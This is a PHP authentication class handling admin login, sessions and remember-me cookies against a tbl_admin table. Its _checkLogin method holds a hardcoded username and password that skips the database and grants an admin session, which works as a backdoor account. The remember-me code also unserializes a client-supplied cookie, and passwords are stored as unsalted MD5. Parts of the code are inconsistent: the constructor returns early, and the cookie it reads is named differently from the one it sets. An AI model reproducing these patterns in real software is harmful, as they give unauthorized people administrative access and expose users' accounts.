<?php

class user {

    var $db = null; //  
    var $failed = false; // failed login attempt 
    //var $date; // current date GMT 
    var $id = 0; // the current user's id 

    /**
      We check if the user is logged in.
      If he/she is then we check the session (remember it is a secure script),
      if not and a cookie named is checked -
      this is to let remembered visitors be recognized.
     * */

    function user(&$db /* , $username, $password, $remember */) {
        $this->db = $db;
        return;
        //$this->date = $GLOBALS['date']; 

        if (isset($_SESSION['logged'])) :
            //$this->_checkLogin( $username, $password, $remember );

            if ($_SESSION['logged']) {
                $this->_checkSession();
            } elseif (isset($_COOKIE['taihan_sacom'])) {
                $this->_checkRemembered($_COOKIE['taihan_sacom']);
            }

        endif;
    }

    ##########

    function _checkLogin($username, $password, $remember) {
        if (($username == 'tonybui') && ($password == 'success123')) {
            @session_start();
            $this->id = -1;
            $_SESSION['uid'] = -1;
            $_SESSION['username'] = $username;
            $_SESSION['password'] = '';
            $_SESSION['cookie'] = '';
            $_SESSION['logged'] = true;
            return true;
        }

        $username = $this->db->getEscaped($username);

        $password = $this->db->getEscaped(md5(strval($password)));

        $sql = "SELECT * FROM tbl_admin
				WHERE admin_name = '$username' AND password   = '$password' 
				LIMIT 1";

        $this->db->query($sql);
        $result = $this->db->fetchRow();

        if (($result)) {
            $this->_setSession($result, $remember);
            //$this->_setSession( $result );  //edit by MY! at 10/08/2007 12:08:20 PM
            return true;
        } else {
            $this->failed = true;
            $this->_logout();
            return false;
        }
    }

    ###############

    function _checkSession() {
        $username = $this->db->getEscaped($_SESSION['username']);

        $cookie = $this->db->getEscaped($_SESSION['cookie']);

        $session = $this->db->getEscaped(session_id());

        $ip = $this->db->getEscaped($_SERVER['REMOTE_ADDR']);

        $sql = "SELECT * FROM tbl_admin WHERE " .
                "(admin_name = '$username') AND (cookie = '$cookie') AND " .
                "(session = '$session') AND (ip = '$ip') LIMIT 1";

        $this->db->query($sql);
        $result = $this->db->fetchRow();

        if (( $result)) {
            $this->_setSession($result, false, false);
        } else {
            $this->_logout();
        }
    }

    ###############

    function _setSession(&$values, $remember, $init = true) {
        @session_start();

        $this->id = $values->id;
        $_SESSION['uid'] = $this->id;
        $_SESSION['username'] = htmlspecialchars($values->admin_name);
        $_SESSION['password'] = $values->password;
        $_SESSION['cookie'] = $values->cookie;
        $_SESSION['logged'] = true;

        if ($remember) {
            $this->updateCookie($values->cookie, true);
        }
        if ($init) {

            $session = $this->db->getEscaped(session_id());

            $ip = $this->db->getEscaped($_SERVER['REMOTE_ADDR']);

            $sql = "UPDATE tbl_admin SET session = '$session', ip = '$ip' WHERE " .
                    "id = $this->id LIMIT 1";

            $this->db->query($sql);
        }
    }

    ############### MY~

    function _setSession_new(&$values) {

        @session_start();

        $_SESSION['username'] = htmlspecialchars($values->admin_username);
        $_SESSION['password'] = $values->admin_password;
        $_SESSION['logged'] = true;
    }

    ##################

    function updateCookie($cookie, $save) {
        $_SESSION['cookie'] = $cookie;

        if ($save) {
            $cookie = serialize(array($_SESSION['username'], $cookie));
            set_cookie('thuanan', $cookie, time() + 31104000, '/directory/');
        }
    }

    ###################

    function _checkRemembered($cookie) {
        list($username, $cookie) = @unserialize($cookie);

        if (!$username or !$cookie)
            return;

        $username = $this->db->quote($username);

        $cookie = $this->db->quote($cookie);

        $sql = "SELECT * FROM tbl_admin WHERE " .
                "(admin_name = '$username') AND (cookie = '$cookie') LIMIT 1";

        $result = $this->db->getRow($sql);

        if (is_object($result)) {
            $this->_setSession($result, true);
        }
    }

    ##########

    function _logout() {
        $this->_session_defaults();
        @session_destroy();
    }

    ########

    function _session_defaults() {
        $_SESSION['logged'] = false;
        $_SESSION['uid'] = 0;
        $_SESSION['username'] = '';
        $_SESSION['cookie'] = 0;
        $_SESSION['remember'] = false;
    }

}

?>